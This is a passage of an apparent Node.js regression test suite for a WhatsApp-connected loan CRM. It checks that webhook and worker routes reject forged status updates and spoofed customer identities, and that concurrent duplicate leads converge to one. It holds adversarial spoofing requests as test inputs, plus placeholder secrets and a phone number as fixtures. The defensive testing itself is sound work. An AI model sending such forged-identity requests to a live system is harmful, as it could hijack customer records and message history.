/**
 * TASK 5H.35 — COMPLETE F34-01 TO F34-05 REMEDIATION, CONCURRENCY,
 * CRASH-RECOVERY & CROSS-PROVIDER ADVERSARIAL VERIFICATION SUITE
 *
 * Exercises REAL transpiled production TypeScript modules and the real unmodified
 * `src/lib/google-sheets/gateway.gs` Apps Script VM (zero live Sheets/provider/DB calls).
 * Poisons MongoDB/Mongoose and PostgreSQL module loads to guarantee zero DB fallback.
 */

'use strict';

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const Module = require('node:module');
const path = require('node:path');
const vm = require('node:vm');
const ts = require('typescript');

const ROOT_DIR = path.resolve(__dirname, '..');
const SRC_DIR = path.join(ROOT_DIR, 'src');

// ============================================================================
// 1. MODULE RESOLVER, TYPESCRIPT COMPILER & DB-ISOLATION POISONING
// ============================================================================
const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    const rel = request.slice(2);
    const base = path.join(SRC_DIR, rel);
    for (const c of [base, `${base}.ts`, `${base}.tsx`, path.join(base, 'index.ts'), path.join(base, 'index.tsx')]) {
      if (fs.existsSync(c) && fs.statSync(c).isFile()) return c;
    }
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

require.extensions['.ts'] = function (mod, filename) {
  const source = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
      allowJs: true
    },
    fileName: filename
  });
  mod._compile(compiled.outputText, filename);
};

class MockNextResponse {
  constructor(body, init = {}) {
    this._body = body;
    this.status = init.status || 200;
    this.headers = new Map(Object.entries(init.headers || {}));
  }
  async json() {
    return typeof this._body === 'string' ? JSON.parse(this._body) : this._body;
  }
  async text() {
    return typeof this._body === 'string' ? this._body : JSON.stringify(this._body);
  }
  static json(data, init = {}) {
    return new MockNextResponse(data, init);
  }
}

let waitUntilPromises = [];
let mongoLoadAttempts = 0;
let pgLoadAttempts = 0;

const origModuleLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'next/server') return { NextResponse: MockNextResponse };
  if (request === '@vercel/functions') {
    return {
      waitUntil: (p) => {
        const tracked = Promise.resolve(p).catch(() => {});
        waitUntilPromises.push(tracked);
        return tracked;
      }
    };
  }
  if (
    request === 'mongoose' ||
    request === '@/lib/db' ||
    request.endsWith('/lib/db') ||
    request === '@/models/Message' ||
    request === '@/models/Lead'
  ) {
    mongoLoadAttempts += 1;
    throw new Error(`POISONED_MONGODB_FALLBACK: ${request}`);
  }
  if (request === 'pg' || request === '@/lib/postgres' || request.endsWith('/postgres')) {
    pgLoadAttempts += 1;
    throw new Error(`POISONED_POSTGRES_FALLBACK: ${request}`);
  }
  return origModuleLoad.call(this, request, parent, isMain);
};

/**
 * Loads a genuinely isolated second instance of project modules with completely
 * independent module-level Maps/Sets/mutexes (simulating a second serverless instance
 * or a cold process restart) while sharing ONLY the external gateway HTTP transport!
 */
function loadIsolatedAppInstance() {
  const savedCache = new Map();
  for (const key of Object.keys(require.cache)) {
    if (key.startsWith(SRC_DIR)) {
      savedCache.set(key, require.cache[key]);
      delete require.cache[key];
    }
  }
  try {
    return {
      contract: require(path.join(SRC_DIR, 'lib/messaging-contract.ts')),
      sheets: require(path.join(SRC_DIR, 'lib/google-sheets/index.ts')),
      aisensy: require(path.join(SRC_DIR, 'lib/aisensy.ts')),
      chatmitra: require(path.join(SRC_DIR, 'lib/chatmitra.ts')),
      metaWebhookRoute: require(path.join(SRC_DIR, 'app/api/whatsapp-webhook/route.ts')),
      cmWebhookRoute: require(path.join(SRC_DIR, 'app/api/chatmitra-webhook/route.ts')),
      workerRoute: require(path.join(SRC_DIR, 'app/api/whatsapp-webhook-worker/route.ts'))
    };
  } finally {
    for (const key of Object.keys(require.cache)) {
      if (key.startsWith(SRC_DIR)) {
        delete require.cache[key];
      }
    }
    for (const [k, v] of savedCache.entries()) {
      require.cache[k] = v;
    }
  }
}

const axios = require('axios');
const contract = require(path.join(SRC_DIR, 'lib/messaging-contract.ts'));
const sheets = require(path.join(SRC_DIR, 'lib/google-sheets/index.ts'));
const aisensy = require(path.join(SRC_DIR, 'lib/aisensy.ts'));
const chatmitra = require(path.join(SRC_DIR, 'lib/chatmitra.ts'));
const aiAgentMod = require(path.join(SRC_DIR, 'lib/ai-agent.ts'));
const metaWebhookRoute = require(path.join(SRC_DIR, 'app/api/whatsapp-webhook/route.ts'));
const cmWebhookRoute = require(path.join(SRC_DIR, 'app/api/chatmitra-webhook/route.ts'));
const workerRoute = require(path.join(SRC_DIR, 'app/api/whatsapp-webhook-worker/route.ts'));

// ============================================================================
// 2. REAL UNMODIFIED `gateway.gs` VM HARNESS
// ============================================================================
const AUTH_PHONE = '+919175635165';
const AUTH_DIGITS = '919175635165';
const META_SECRET = 'task5h35_meta_secret_0123456789ab';
const CM_SECRET = 'task5h35_cm_secret_0123456789abcd';
const WORKER_SECRET = 'task5h35_wrk_secret_0123456789abc';
const GATEWAY_SECRET = 'task5h35_gw_hmac_secret_0123456789abcdef';
const ALLOWED_SS_ID = 'SPREADSHEET_TASK5H35_VM_ISOLATED';

function createGatewayVmHarness() {
  const gatewaySrc = fs.readFileSync(path.join(SRC_DIR, 'lib/google-sheets/gateway.gs'), 'utf8');
  const sheetsMap = new Map();
  for (const [tab, cols] of Object.entries(sheets.SHEET_COLUMNS)) {
    sheetsMap.set(tab, [[...cols]]);
  }
  const nowIso = new Date().toISOString();
  sheetsMap.get('ADVISORS').push(['ADV-SACHIN-01', 'Sachin Shinde', 'ACTIVE', 'CHIEF_LOAN_ADVISOR', nowIso, nowIso]);
  sheetsMap.get('SYSTEM_CONFIG').push(
    ['spreadsheet_name', 'AVANI_LOAN_SERVICES_CRM_MASTER', nowIso],
    ['schema_validation_status', 'VALID', nowIso],
    ['system_health_status', 'HEALTHY', nowIso]
  );

  const scriptCache = new Map();
  let lockHeld = false;
  const stats = { calls: 0, actions: {} };

  function makeSheetObj(name) {
    return {
      getName: () => name,
      getLastRow: () => sheetsMap.get(name).length,
      getLastColumn: () => (sheetsMap.get(name)[0] || []).length,
      appendRow: (vals) => {
        sheetsMap.get(name).push(vals.map((v) => String(v ?? '')));
      },
      deleteRow: (rowIdx1) => {
        sheetsMap.get(name).splice(rowIdx1 - 1, 1);
      },
      getRange: (r, c, numR, numC) => ({
        getValues: () => {
          const rows = sheetsMap.get(name);
          const out = [];
          for (let i = 0; i < numR; i++) {
            const row = rows[r - 1 + i] || [];
            out.push(row.slice(c - 1, c - 1 + numC));
          }
          return out;
        },
        setValues: (vals2d) => {
          const rows = sheetsMap.get(name);
          for (let i = 0; i < vals2d.length; i++) {
            rows[r - 1 + i] = vals2d[i].map((v) => String(v ?? ''));
          }
        }
      })
    };
  }

  const sandbox = {
    Date,
    Math,
    JSON,
    String,
    Number,
    Array,
    Object,
    Boolean,
    RegExp,
    isFinite,
    LockService: {
      getScriptLock: () => ({
        waitLock: () => {
          lockHeld = true;
        },
        hasLock: () => lockHeld,
        releaseLock: () => {
          lockHeld = false;
        }
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => {
          if (k === 'GATEWAY_HMAC_SECRET') return GATEWAY_SECRET;
          if (k === 'ALLOWED_SPREADSHEET_ID') return ALLOWED_SS_ID;
          return null;
        }
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (scriptCache.has(k) ? scriptCache.get(k) : null),
        put: (k, v) => scriptCache.set(k, v)
      })
    },
    Utilities: {
      Charset: { UTF_8: 'utf8' },
      computeHmacSha256Signature: (data, secret) => {
        const buf = crypto.createHmac('sha256', secret).update(data, 'utf8').digest();
        return Array.from(buf).map((b) => (b > 127 ? b - 256 : b));
      }
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getId: () => ALLOWED_SS_ID,
        getName: () => 'AVANI_LOAN_SERVICES_CRM_MASTER',
        getSheetByName: (t) => (sheetsMap.has(t) ? makeSheetObj(t) : null)
      })
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (txt) => ({
        _txt: txt,
        setMimeType() {
          return this;
        },
        getContent() {
          return this._txt;
        }
      })
    }
  };
  vm.createContext(sandbox);
  vm.runInContext(gatewaySrc, sandbox);

  const gatewayFetch = async (_url, init) => {
    stats.calls += 1;
    const rawBody = String(init?.body || '');
    try {
      const env = JSON.parse(rawBody);
      const cmd = JSON.parse(env.payloadJson || '{}');
      stats.actions[cmd.action] = (stats.actions[cmd.action] || 0) + 1;
    } catch {
      // ignore
    }
    const out = sandbox.doPost({ postData: { contents: rawBody } });
    const parsed = JSON.parse(out.getContent());
    return {
      ok: parsed.status >= 200 && parsed.status < 300,
      status: parsed.status || 200,
      json: async () => parsed,
      text: async () => out.getContent()
    };
  };

  return { sheetsMap, stats, gatewayFetch };
}

// ============================================================================
// 3. SHARED TEST HELPERS
// ============================================================================
const origFetch = globalThis.fetch;
const origAxiosPost = axios.post;
const origAi = aiAgentMod.AgentEngine.processMessage;

function snapshotEnv() {
  return { ...process.env };
}

function restoreEnv(snap) {
  for (const k of Object.keys(process.env)) {
    if (!(k in snap)) delete process.env[k];
  }
  Object.assign(process.env, snap);
}

function setupMockEnv() {
  sheets.resetMockSheetsStore();
  sheets.resetNoncesForTesting();
  waitUntilPromises = [];
  process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'MOCK_IN_MEMORY';
  process.env.GOOGLE_SHEETS_ENABLE_MOCK = 'true';
  process.env.PROVIDER_MODE = 'live';
  process.env.AUTHORIZED_TEST_PHONE_CANONICAL = AUTH_PHONE;
  process.env.WHATSAPP_TOKEN = 'EAAG_5H35_TEST_TOKEN_ABCDEF123456';
  process.env.WHATSAPP_PHONE_NUMBER_ID = '1147494668457940';
  process.env.META_APP_SECRET = META_SECRET;
  process.env.CHATMITRA_WEBHOOK_SECRET = CM_SECRET;
  process.env.CHATMITRA_API_KEY = 'CM_5H35_TEST_API_KEY';
  process.env.INTERNAL_WORKER_SECRET = WORKER_SECRET;
  process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'false';
  process.env.AISENSY_INBOUND_WEBHOOK_ENABLED = 'true';
  process.env.CHATMITRA_INBOUND_AUTO_REPLY_ENABLED = 'false';
  process.env.AUTO_REPLY_ENABLED = 'false';
  process.env.SAFE_MODE_FORCE_SUPPRESS = 'false';
  delete process.env.AISENCY_WABA_API_KEY;
  delete process.env.OMNIDIM_API_KEY;
  delete process.env.ACTIVE_WHATSAPP_PROVIDER;
  delete process.env.WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS;
  delete process.env.GOOGLE_SHEETS_GATEWAY_TIMEOUT_MS;
}

function signBody(raw, secret, prefix = '') {
  return prefix + crypto.createHmac('sha256', secret).update(raw, 'utf8').digest('hex');
}

function makeWorkerRequest(body, secret = WORKER_SECRET) {
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook-worker', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(secret ? { 'x-worker-auth': secret } : {})
    },
    body: JSON.stringify(body)
  });
}

function makeSharedWebhookRequest(body, { secret = CM_SECRET, header = 'x-webhook-signature', prefix = '', correlationId } = {}) {
  const raw = typeof body === 'string' ? body : JSON.stringify(body);
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      [header]: signBody(raw, secret, prefix),
      ...(correlationId ? { 'x-correlation-id': correlationId } : {})
    },
    body: raw
  });
}

function makeChatMitraRequest(body, { secret = CM_SECRET, header = 'x-webhook-signature', prefix = '', correlationId } = {}) {
  const raw = typeof body === 'string' ? body : JSON.stringify(body);
  return new Request('https://www.avanifinserv.com/api/chatmitra-webhook', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      [header]: signBody(raw, secret, prefix),
      ...(correlationId ? { 'x-correlation-id': correlationId } : {})
    },
    body: raw
  });
}

function wireLocalWorkerFetch(targetWorker = workerRoute) {
  globalThis.fetch = async (url, init) => {
    const wResp = await targetWorker.POST(
      new Request(url, { method: init.method, headers: init.headers, body: init.body })
    );
    return {
      ok: wResp.status >= 200 && wResp.status < 300,
      status: wResp.status,
      json: () => wResp.json(),
      text: () => wResp.text()
    };
  };
}

// ============================================================================
// GROUP 1 — DEFECT F34-01: CUSTOMER IDENTITY OWNERSHIP BYPASS
// ============================================================================
describe('Group 1 — F34-01 Customer Identity Ownership Bypass Remediation', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    aiAgentMod.AgentEngine.processMessage = origAi;
    restoreEnv(envSnap);
  });

  async function seedVictimAndSender() {
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-VICTIM-5H35',
      customer_name: 'Victim Customer',
      mobile_number: '+919822999000',
      city: 'Pune',
      enquiry_source: 'WEBSITE'
    });
    await sheets.leadRepository.upsertLead({
      lead_id: 'AVL-VICTIM-5H35',
      customer_id: 'CUST-VICTIM-5H35',
      loan_category: 'Home Loan'
    });
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-SENDER-5H35',
      customer_name: 'Sender Customer',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    await sheets.leadRepository.upsertLead({
      lead_id: 'AVL-SENDER-5H35',
      customer_id: 'CUST-SENDER-5H35',
      loan_category: 'Business Loan'
    });
  }

  it('F34-01-T01: Missing phone + victim customerId fails closed (MISSING_OR_INVALID_PHONE)', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: undefined,
      candidateCustomerId: 'CUST-VICTIM-5H35'
    });
    assert.equal(res.verified, false);
    assert.equal(res.customerId, undefined);
    assert.equal(res.rejectedCandidateCustomerId, true);
    assert.equal(res.rejectionReason, 'MISSING_OR_INVALID_PHONE');
  });

  it('F34-01-T02: Invalid phone + victim customerId fails closed (ADV-5H34-D01-01 exact replay)', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: 'INVALID_PHONE_TEXT',
      candidateCustomerId: 'CUST-VICTIM-5H35'
    });
    assert.equal(res.verified, false);
    assert.equal(res.customerId, undefined);
    assert.equal(res.rejectedCandidateCustomerId, true);
    assert.equal(res.rejectionReason, 'MISSING_OR_INVALID_PHONE');

    const statusResp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_STATUS_SPOOF_5H35',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-SPOOF-5H35',
        data: {
          msgId: 'wamid.spoofed_status_attach_01',
          statusStr: 'delivered',
          fromPhone: 'INVALID_PHONE_TEXT',
          customerId: 'CUST-VICTIM-5H35'
        }
      })
    );
    assert.equal(statusResp.status, 400);
    const data = await statusResp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.error, 'MISSING_OR_INVALID_PHONE');
    const row = await sheets.messageEventRepository.findByProviderMessageId('wamid.spoofed_status_attach_01', 'Meta');
    assert.equal(row, null, 'Must NOT attach forged status update to victim customer');
  });

  it('F34-01-T03: Null normalized phone never matches in customerMatchesPhone or verifyCustomerAndLeadOwnership', async () => {
    await seedVictimAndSender();
    const victim = await sheets.customerRepository.findById('CUST-VICTIM-5H35');
    assert.equal(sheets.customerMatchesPhone(victim, null), false);
    assert.equal(sheets.customerMatchesPhone(victim, ''), false);
    assert.equal(sheets.customerMatchesPhone({ ...victim, mobile_number: 'INVALID' }, null), false);
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: null,
      candidateCustomerId: 'CUST-VICTIM-5H35',
      candidateLeadId: 'AVL-VICTIM-5H35'
    });
    assert.equal(res.verified, false);
    assert.equal(res.rejectedCandidateCustomerId, true);
    assert.equal(res.rejectedCandidateLeadId, true);
    assert.equal(res.rejectionReason, 'MISSING_OR_INVALID_PHONE');
  });

  it('F34-01-T04: Empty and whitespace phone + victim customerId fails closed', async () => {
    await seedVictimAndSender();
    for (const badPhone of ['', '   ', '\t\n']) {
      const res = await sheets.verifyCustomerAndLeadOwnership({
        fromPhone: badPhone,
        candidateCustomerId: 'CUST-VICTIM-5H35'
      });
      assert.equal(res.verified, false);
      assert.equal(res.rejectedCandidateCustomerId, true);
      assert.equal(res.rejectionReason, 'MISSING_OR_INVALID_PHONE');
    }
  });

  it('F34-01-T05: Malformed international phone numbers + victim customerId fail closed', async () => {
    await seedVictimAndSender();
    for (const badIntl of ['+441234567890', '+12025550199', '+911234567890', '+910000000000', '+91999']) {
      const res = await sheets.verifyCustomerAndLeadOwnership({
        fromPhone: badIntl,
        candidateCustomerId: 'CUST-VICTIM-5H35'
      });
      assert.equal(res.verified, false, `Malformed phone ${badIntl} must fail closed`);
      assert.equal(res.customerId, undefined);
      assert.equal(res.rejectionReason, 'MISSING_OR_INVALID_PHONE');
    }
  });

  it('F34-01-T06: Valid phone belonging to different customer + victim customerId rejects victim', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: AUTH_PHONE,
      candidateCustomerId: 'CUST-VICTIM-5H35'
    });
    assert.equal(res.verified, true);
    assert.equal(res.customerId, 'CUST-SENDER-5H35', 'Must resolve authenticated sender, NEVER victim');
    assert.equal(res.rejectedCandidateCustomerId, true);
    assert.equal(res.rejectionReason, 'CUSTOMER_MOBILE_MISMATCH');

    // Unregistered valid phone + victim customerId -> verified: false, zero fabricated customer
    const unregRes = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: '+919700112233',
      candidateCustomerId: 'CUST-VICTIM-5H35'
    });
    assert.equal(unregRes.verified, false);
    assert.equal(unregRes.customerId, undefined);
    assert.equal(unregRes.rejectedCandidateCustomerId, true);
    assert.equal(unregRes.rejectionReason, 'CUSTOMER_MOBILE_MISMATCH');
  });

  it('F34-01-T07: Correct phone + correct customer + correct lead verifies cleanly', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: AUTH_PHONE,
      candidateCustomerId: 'CUST-SENDER-5H35',
      candidateLeadId: 'AVL-SENDER-5H35'
    });
    assert.equal(res.verified, true);
    assert.equal(res.customerId, 'CUST-SENDER-5H35');
    assert.equal(res.leadId, 'AVL-SENDER-5H35');
    assert.equal(res.leadExplicitlyVerified, true);
    assert.equal(res.rejectedCandidateCustomerId, false);
    assert.equal(res.rejectedCandidateLeadId, false);
  });

  it('F34-01-T08: Correct customer + foreign lead rejects foreign lead without mutation', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: AUTH_PHONE,
      candidateCustomerId: 'CUST-SENDER-5H35',
      candidateLeadId: 'AVL-VICTIM-5H35'
    });
    assert.equal(res.verified, true);
    assert.equal(res.customerId, 'CUST-SENDER-5H35');
    assert.equal(res.leadId, 'AVL-SENDER-5H35');
    assert.equal(res.leadExplicitlyVerified, false);
    assert.equal(res.rejectedCandidateLeadId, true);
    assert.equal(res.rejectionReason, 'LEAD_OWNERSHIP_MISMATCH');
  });

  it('F34-01-T09: Correct lead + foreign customer rejects foreign customer while checking ownership', async () => {
    await seedVictimAndSender();
    const res = await sheets.verifyCustomerAndLeadOwnership({
      fromPhone: AUTH_PHONE,
      candidateCustomerId: 'CUST-VICTIM-5H35',
      candidateLeadId: 'AVL-SENDER-5H35'
    });
    assert.equal(res.verified, true);
    assert.equal(res.customerId, 'CUST-SENDER-5H35');
    assert.equal(res.leadId, 'AVL-SENDER-5H35');
    assert.equal(res.leadExplicitlyVerified, true);
    assert.equal(res.rejectedCandidateCustomerId, true);
    assert.equal(res.rejectedCandidateLeadId, false);
    assert.equal(res.rejectionReason, 'CUSTOMER_MOBILE_MISMATCH');
  });

  it('F34-01-T10: STATUS_UPDATE with forged identity rejected on both new and existing canonical MESSAGE_EVENTS', async () => {
    await seedVictimAndSender();
    // 1. Existing canonical row belonging to Victim
    await sheets.messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.victim_existing_1',
      customer_id: 'CUST-VICTIM-5H35',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: 'wamid.victim_existing_1'
    });

    // Forged STATUS_UPDATE with mismatched customerId on existing Victim row -> HTTP 400
    const rBadCust = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_ST_FORGED_CUST',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-FC',
        data: {
          msgId: 'wamid.victim_existing_1',
          statusStr: 'read',
          customerId: 'CUST-SENDER-5H35'
        }
      })
    );
    assert.equal(rBadCust.status, 400);
    assert.equal((await rBadCust.json()).persisted, false);

    // Forged STATUS_UPDATE with mismatched phone on existing Victim row -> HTTP 400
    const rBadPhone = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_ST_FORGED_PHONE',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-FP',
        data: {
          msgId: 'wamid.victim_existing_1',
          statusStr: 'read',
          fromPhone: AUTH_PHONE
        }
      })
    );
    assert.equal(rBadPhone.status, 400);
    const unchanged = await sheets.messageEventRepository.findByProviderMessageId('wamid.victim_existing_1', 'Meta');
    assert.equal(unchanged.customer_id, 'CUST-VICTIM-5H35');
    assert.equal(unchanged.delivery_status, 'SENT', 'Forged status update must NOT mutate delivery status');

    // New STATUS_UPDATE with missing phone + caller-supplied victim customerId -> HTTP 400
    const rNoPhoneSpoof = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_ST_NOPHONE_SPOOF',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-NPS',
        data: {
          msgId: 'wamid.forged_nophone_1',
          statusStr: 'delivered',
          customerId: 'CUST-VICTIM-5H35'
        }
      })
    );
    assert.equal(rNoPhoneSpoof.status, 400);
    assert.equal(await sheets.messageEventRepository.findByProviderMessageId('wamid.forged_nophone_1', 'Meta'), null);
  });

  it('F34-01-T11: Concurrent attempts to attach the same MESSAGE_EVENTS row to two customers fail closed on conflict', async () => {
    await seedVictimAndSender();
    const [rA, rB] = await Promise.allSettled([
      sheets.messageEventRepository.recordMessageEvent({
        event_id: 'MSG_META_wamid.race_owner_1',
        customer_id: 'CUST-VICTIM-5H35',
        provider: 'Meta',
        message_type: 'TEXT',
        direction: 'outbound',
        delivery_status: 'SENT',
        provider_message_id: 'wamid.race_owner_1'
      }),
      sheets.messageEventRepository.recordMessageEvent({
        event_id: 'MSG_META_wamid.race_owner_1',
        customer_id: 'CUST-SENDER-5H35',
        provider: 'Meta',
        message_type: 'TEXT',
        direction: 'outbound',
        delivery_status: 'DELIVERED',
        provider_message_id: 'wamid.race_owner_1'
      })
    ]);

    const fulfilled = [rA, rB].filter((r) => r.status === 'fulfilled');
    const rejected = [rA, rB].filter((r) => r.status === 'rejected');
    assert.equal(fulfilled.length, 1, 'Exactly one owner may bind the message event');
    assert.equal(rejected.length, 1, 'Conflicting customer attachment MUST reject fail-closed');
    assert.match(rejected[0].reason.message, /ownership conflict/i);

    const stored = await sheets.messageEventRepository.findById('MSG_META_wamid.race_owner_1');
    assert.equal(stored.customer_id, fulfilled[0].value.record.customer_id);

    // Also verify downgrade back to UNRESOLVED_* fails closed
    await assert.rejects(
      () =>
        sheets.messageEventRepository.recordMessageEvent({
          event_id: 'MSG_META_wamid.race_owner_1',
          customer_id: sheets.buildScopedUnresolvedCustomerId('Meta', 'wamid.race_owner_1', 'C'),
          provider: 'Meta',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'DELIVERED',
          provider_message_id: 'wamid.race_owner_1'
        }),
      /downgrade/i
    );
  });

  it('F34-01-T12: Identity verification never fabricates customer IDs and never bypasses opt-out/consent guards', async () => {
    await seedVictimAndSender();
    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'true';
    await sheets.consentRepository.upsertConsent({
      customer_id: 'CUST-SENDER-5H35',
      channel: 'WHATSAPP',
      consent_status: 'WITHDRAWN',
      consent_source: 'WHATSAPP_OPTOUT',
      optout_status: 'OPTED_OUT'
    });
    let aiCalls = 0;
    aiAgentMod.AgentEngine.processMessage = async () => {
      aiCalls++;
      return { nextQuestion: 'Should never fire', updatedState: 'QUALIFYING' };
    };

    const resp = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_IN_OPT_GUARD',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-OG',
        data: {
          fromPhone: AUTH_PHONE,
          msgId: 'wamid.opt_guard_1',
          customerId: 'CUST-VICTIM-5H35',
          leadId: 'AVL-VICTIM-5H35',
          message: { type: 'text', text: { body: 'Need a Home Loan' }, id: 'wamid.opt_guard_1' }
        }
      })
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.customerId, 'CUST-SENDER-5H35');
    assert.equal(data.optedOutSuppressed, true);
    assert.equal(aiCalls, 0, 'Opted-out customer must never trigger AI reply');
    assert.equal((await sheets.leadRepository.findById('AVL-VICTIM-5H35')).customer_id, 'CUST-VICTIM-5H35');
  });
});

// ============================================================================
// GROUP 2 — DEFECT F34-02: CONCURRENT DUPLICATE LEAD CREATION
// ============================================================================
describe('Group 2 — F34-02 Concurrent Duplicate Lead Deduplication & Multi-Instance Convergence', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    aiAgentMod.AgentEngine.processMessage = origAi;
    restoreEnv(envSnap);
  });

  it('F34-02-T01: Four simultaneous requests for same new customer and same enquiry converge on 1 lead (ADV-5H34-D01-02 replay)', async () => {
    const responses = await Promise.all(
      [1, 2, 3, 4].map((i) =>
        workerRoute.POST(
          makeWorkerRequest({
            eventId: `META_CONC_4_${i}`,
            eventType: 'INBOUND_MESSAGE',
            provider: 'Meta',
            correlationId: `CORR-CONC4-${i}`,
            data: {
              fromPhone: AUTH_PHONE,
              msgId: `wamid.conc4_${i}`,
              profileName: `Concurrent User ${i}`,
              message: { type: 'text', text: { body: 'Need a Business Loan' }, id: `wamid.conc4_${i}` }
            }
          })
        )
      )
    );
    assert.deepEqual(responses.map((r) => r.status), [200, 200, 200, 200]);
    const custs = await sheets.customerRepository.findAll();
    const leads = await sheets.leadRepository.findAll();
    const msgs = await sheets.messageEventRepository.findAll();
    const followups = await sheets.followupRepository.findAll();
    assert.equal(custs.length, 1);
    assert.equal(leads.length, 1, '4 simultaneous requests for same enquiry MUST converge to 1 logical lead');
    assert.equal(msgs.length, 4);
    assert.equal(followups.length, 1);
  });

  it('F34-02-T02: Ten simultaneous duplicate webhook deliveries converge idempotently with zero duplicate leads or messages', async () => {
    wireLocalWorkerFetch();
    const payload = {
      event: 'message.received',
      id: 'cm_burst_dup_10',
      from: AUTH_DIGITS,
      name: 'Burst Customer',
      text: 'I want a Home Loan of 40 lakh'
    };
    const responses = await Promise.all(
      Array.from({ length: 10 }, () => metaWebhookRoute.POST(makeSharedWebhookRequest(payload)))
    );
    assert.ok(responses.every((r) => r.status === 200));
    const bodies = await Promise.all(responses.map((r) => r.json()));
    const nonDups = bodies.filter((b) => !b.duplicate);
    const dups = bodies.filter((b) => b.duplicate === true);
    assert.equal(nonDups.length, 1);
    assert.equal(dups.length, 9);
    assert.equal((await sheets.webhookEventRepository.findAll()).length, 1);
    assert.equal((await sheets.customerRepository.findAll()).length, 1);
    assert.equal((await sheets.leadRepository.findAll()).length, 1);
    assert.equal((await sheets.messageEventRepository.findAll()).length, 1);
  });

  it('F34-02-T03: Same customer with two different valid enquiries creates two distinct leads (zero false merging)', async () => {
    const enq1 = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Sachin Shinde',
      phone: AUTH_PHONE,
      loanCategory: 'Business Loan',
      enquiryKey: 'ENQ-2026-MACHINERY',
      requestedAmount: '2000000'
    });
    const enq2 = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Sachin Shinde',
      phone: AUTH_PHONE,
      loanCategory: 'Business Loan',
      enquiryKey: 'ENQ-2026-WORKING-CAPITAL',
      requestedAmount: '1500000'
    });
    assert.equal(enq1.customer.customer_id, enq2.customer.customer_id);
    assert.notEqual(enq1.lead.lead_id, enq2.lead.lead_id, 'Distinct valid enquiries must NOT merge');
    assert.equal((await sheets.customerRepository.findAll()).length, 1);
    assert.equal((await sheets.leadRepository.findAll()).length, 2);

    // Repeating enq1 converges deterministically onto enq1.lead.lead_id
    const enq1Retry = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Sachin Shinde',
      phone: AUTH_PHONE,
      loanCategory: 'Business Loan',
      enquiryKey: 'ENQ-2026-MACHINERY',
      requestedAmount: '2500000'
    });
    assert.equal(enq1Retry.lead.lead_id, enq1.lead.lead_id);
    assert.equal((await sheets.leadRepository.findAll()).length, 2);
  });

  it('F34-02-T04: Same phone with different loan categories creates separate leads via both service and inbound worker', async () => {
    const rHome = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_CAT_HOME',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-CH',
        data: {
          fromPhone: AUTH_PHONE,
          msgId: 'wamid.cat_home_1',
          profileName: 'Multi Product User',
          message: { type: 'text', text: { body: 'I want a Home Loan for flat purchase' }, id: 'wamid.cat_home_1' }
        }
      })
    );
    const rBiz = await workerRoute.POST(
